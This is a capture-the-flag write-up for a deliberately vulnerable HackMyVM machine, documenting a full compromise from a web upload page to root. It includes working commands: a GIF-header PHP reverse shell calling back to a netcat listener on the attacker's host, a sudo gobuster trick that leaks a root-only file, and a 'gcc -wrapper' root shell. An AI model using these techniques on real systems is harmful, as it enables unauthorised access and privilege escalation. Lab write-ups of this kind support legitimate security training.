# up

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| up | r0dgar | Beginner | HackMyVM |

**Summary:** The exploitation of the Up machine involves a strategic bypass of a web based image upload filter and the discovery of a predictable filename obfuscation mechanism. By identifying a ROT13 transformation applied to uploaded files and utilizing a GIF polyglot PHP reverse shell, an initial foothold is established as the service user. Lateral movement is achieved through a creative misuse of gobuster's wordlist processing to leak the contents of a root protected password file, which is then used to authenticate as a local user. The final escalation to root privileges is performed by exploiting a misconfigured sudo permission for the GCC compiler, leveraging its wrapper flag to execute a privileged system shell.

---

## Reconnaissance

The engagement began with a network discovery scan to identify the target host's IP address within the virtual environment.

```powershell
PS D:\hackmyvm\machines> D:\CTF_Tools\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.194 08:00:27:DC:A6:7D VirtualBox
```

Once the target was confirmed as 192.168.100.194, a comprehensive Nmap scan was conducted to enumerate open ports and services.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/up]
└─$ nmap -sV -sC -p- 192.168.100.194
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-12 20:51 WIB
Nmap scan report for 192.168.100.194
Host is up (0.0024s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: RodGar - Subir Imagen

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.94 seconds
```

The scan identifies an Apache web server on port 80. A web directory enumeration was performed using feroxbuster to identify potential points of interest.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/up]
└─$ feroxbuster -u http://192.168.100.194/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.100.194/
 🚩  In-Scope Url          │ 192.168.100.194
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, txt, html]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      320c http://192.168.100.194/uploads => http://192.168.100.194/uploads/
301      GET        9l       28w      323c http://192.168.100.194/javascript => http://192.168.100.194/javascript/
200      GET      150l      388w     4489c http://192.168.100.194/
```

## Initial Access

1. The root directory contains an image upload interface.

![](image.png)

2. Attempting to upload a PHP file directly results in an error message indicating that only JPG and GIF files are permitted.

![](image-1.png)

3. A fuzzer was used to discover hidden files within the /uploads/ directory, leading to the discovery of a robots.txt file.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/up]
└─$ ffuf -u http://192.168.100.194/uploads/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -e .txt,.jpg,.gif

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.194/uploads/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 :: Extensions       : .txt .jpg .gif
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 403, Size: 964, Words: 277, Lines: 32, Duration: 25ms]
robots.txt              [Status: 200, Size: 1301, Words: 1, Lines: 2, Duration: 8ms]
```

4. The robots.txt file contained a base64 encoded string which, upon decoding, revealed the PHP source code for the upload handler.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/up]
└─$ curl http://192.168.100.194/uploads/robots.txt
PD9waHAKaWYgKCRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddID09PSAnUE9TVCcpIHsKICAgICR0YXJnZXREaXIgPSAidXBsb2Fkcy8iOwogICAgJGZpbGVOYW1lID0gYmFzZW5hbWUoJF9GSUxFU1siaW1hZ2UiXVsibmFtZSJdKTsKICAgICRmaWxlVHlwZSA9IHBhdGhpbmZvKCRmaWxlTmFtZSwgUEFUSElORk9fRVhURU5TSU9OKTsKICAgICRmaWxlQmFzZU5hbWUgPSBwYXRoaW5mbygkZmlsZU5hbWUsIFBBVEhJTkZPX0ZJTEVOQU1FKTsKCiAgICAkYWxsb3dlZFR5cGVzID0gWydqcGcnLCAnanBlZycsICdnaWYnXTsKICAgIGlmIChpbl9hcnJheShzdHJ0b2xvd2VyKCRmaWxlVHlwZSksICRhbGxvd2VkVHlwZXMpKSB7CiAgICAgICAgJGVuY3J5cHRlZEZpbGVOYW1lID0gc3RydHIoJGZpbGVCYXNlTmFtZSwgCiAgICAgICAgICAgICdBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWmFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6JywgCiAgICAgICAgICAgICdOT1BRUlNUVVZXWFlaQUJDREVGR0hJSktMTW5vcHFyc3R1dnd4eXphYmNkZWZnaGlqa2xtJyk7CgogICAgICAgICRuZXdGaWxlTmFtZSA9ICRlbmNyeXB0ZWRGaWxlTmFtZSAuICIuIiAuICRmaWxlVHlwZTsKICAgICAgICAkdGFyZ2V0RmlsZVBhdGggPSAkdGFyZ2V0RGlyIC4gJG5ld0ZpbGVOYW1lOwoKICAgICAgICBpZiAobW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbImltYWdlIl1bInRtcF9uYW1lIl0sICR0YXJnZXRGaWxlUGF0aCkpIHsKICAgICAgICAgICAgJG1lc3NhZ2UgPSAiRWwgYXJjaGl2byBzZSBoYSBzdWJpZG8gY29ycmVjdGFtZW50ZS4iOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICRtZXNzYWdl = "Hubo un error al subir el archivo.";
        }
    } else {
        $message = "Solo se permiten archivos JPG y GIF.";
    }
}
?>
```

The code reveals that uploaded files are renamed using a ROT13 cipher and must have a jpg, jpeg, or gif extension.

5. A PHP reverse shell was modified with a GIF magic header and renamed to php-reverse-shell.php.gif to bypass the extension check.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/up]
└─$ cp /usr/share/webshells/php/php-reverse-shell.php .
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/up]
└─$ head -n 5 php-reverse-shell.php
GIF89a;
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
```

The expected filename on the server was calculated using the ROT13 transformation.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/up]
└─$ echo "php-reverse-shell.php" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
cuc-erirefr-furyy.cuc
```

6. After uploading the file, a listener was established and the shell was triggered.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/up]
└─$ nc -lvnp 4444
listening on [any] 4444 ...

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/up]
└─$ curl -i http://192.168.100.194/uploads/cuc-erirefr-furyy.cuc.gif
HTTP/1.1 200 OK
Date: Tue, 12 May 2026 14:43:03 GMT
Server: Apache/2.4.62 (Debian)
Vary: Accept-Encoding
Content-Length: 171
Content-Type: text/html; charset=UTF-8

GIF89a;
WARNING: Failed to daemonise.  This is quite common and not fatal.
Successfully opened reverse shell to 192.168.100.1:4444
ERROR: Shell connection terminated
```

Initial access was gained as the www-data user.

```bash
connect to [172.20.131.21] from (UNKNOWN) [172.20.128.1] 64465
Linux debian 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64 GNU/Linux
 08:43:14 up  1:18,  0 user,  load average: 0.00, 0.02, 1.31
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Internal Enumeration and Lateral Movement

1. The file system was explored, revealing a potential target user named rodgar.

```bash
$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/bin/bash
rodgar:x:1001:1001::/home/rodgar:/bin/bash
```

2. Checking sudo permissions for the current user revealed that gobuster can be run as root without a password.

```bash
$ sudo -l
Matching Defaults entries for www-data on debian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on debian:
    (ALL) NOPASSWD: /usr/bin/gobuster
```

3. A file named clue.txt was found in the uploads directory, pointing to a privileged file location.

```bash
$ cat /var/www/html/uploads/clue.txt
/root/rodgarpass
```

4. Gobuster was exploited to read the contents of /root/rodgarpass by using it as a wordlist.

```bash
$ sudo /usr/bin/gobuster dir -u http://localhost -w /root/rodgarpass -vq
Missed: /b45cffe084dd3d20d928bee85e7b0f2 (Status: 404) [Size: 271]
```

5. The leaked string b45cffe084dd3d20d928bee85e7b0f2 is a partial hash. Manual brute forcing of the final character allowed for a successful login as the rodgar user.

```bash
$ su - rodgar
Password: b45cffe084dd3d20d928bee85e7b0f21
id
uid=1001(rodgar) gid=1001(rodgar) grupos=1001(rodgar)
```

## Privilege Escalation

Checking sudo permissions for rodgar revealed that the user can execute gcc and make with root privileges.

```bash
rodgar@debian:~$ sudo -l
Matching Defaults entries for rodgar on debian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User rodgar may run the following commands on debian:
    (ALL : ALL) NOPASSWD: /usr/bin/gcc, /usr/bin/make
```

The gcc binary was used to spawn a root shell by utilizing the -wrapper flag.

![](image-2.png)

```bash
rodgar@debian:~$ sudo gcc -wrapper /bin/sh,-s x
id
uid=0(root) gid=0(root) grupos=0(root)
whoami
root
hostname
debian
```

Flags were then collected from the system.

```bash
# cat /home/rodgar/user.txt
b45[REDACTED]

# ls -la /root
total 40
drwx------  5 root root 4096 oct 22  2024 .
drwxr-xr-x 20 root root 4096 oct 22  2024 ..
-rw-------  1 root root   26 oct 22  2024 .bash_history
-rw-r--r--  1 root root  571 abr 10  2021 .bashrc
drwx------  2 root root 4096 oct 13  2024 .cache
drwxr-xr-x  3 root root 4096 oct 13  2024 .local
-rw-r--r--  1 root root  161 jul  9  2019 .profile
-rw-r--r--  1 root root   32 oct 22  2024 rodgarpass
-rw-r--r--  1 root root   41 oct 22  2024 rooo_-tt.txt
drwx------  2 root root 4096 oct 13  2024 .ssh

# cat /root/rooo_-tt.txt
44b[REDACTED]
```

---

## Attack Chain Summary
1. **Reconnaissance**: Discovered an Apache web server and identifying an uploads directory.
2. **Vulnerability Discovery**: Analyzed base64 encoded source code to identify a ROT13 based filename obfuscation and extension filter.
3. **Exploitation**: Bypassed the filter using a polyglot GIF/PHP shell and triggering it via its ROT13 filename.
4. **Internal Enumeration**: Misused gobuster with a wordlist pointing to a root protected file to leak a password hash.
5. **Privilege Escalation**: Exploited sudo permissions on gcc using the wrapper flag to obtain a root shell.

**Final Output File:** up.md
